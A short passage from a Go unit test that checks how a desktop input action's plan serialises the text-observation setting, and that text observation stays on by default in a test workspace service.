		DesktopInputAction: DesktopInputAction{Action: "key", Combo: "Return"},
		Observe:            &DesktopObserveRequest{Text: &on},
	})
	require.NoError(t, err)
	assert.Contains(t, planJSON, `"observe":{"text":0,`)

	// The default keeps text on.
	assert.True(t, newWorkspaceServiceForTests(desktopWorkspaceQuerier(nil)).desktopObserveText)
}
